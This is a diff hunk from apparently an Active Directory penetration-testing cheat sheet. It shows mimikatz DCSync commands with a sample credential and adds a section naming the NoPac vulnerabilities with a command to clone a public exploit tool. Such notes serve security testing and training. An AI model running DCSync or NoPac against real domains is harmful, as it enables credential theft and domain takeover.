@@ -464,6 +464,14 @@ lsadump::dcsync /domain:<domain> /dc:<domain controller> /user:<specific user> /
 <# e.g., lsadump::dcsync /domain:TEST.LOCAL /user:user01 /authuser:vitamin /authdomain:TEST /authpassword:"eRFWE5756872Gn" /authntlm #>
 ```
 
+### Vulnerabilities
+
+NoPac CVE-2021-42278 & CVE-2021-42287
+
+```
+git clone https://github.com/Ridter/noPac.git
+```
+
 ### :open_file_folder: Test Environment
 
 First we have to set up AD server, we can use the evaluation edition of windows sever. I chose to download the VHD version.
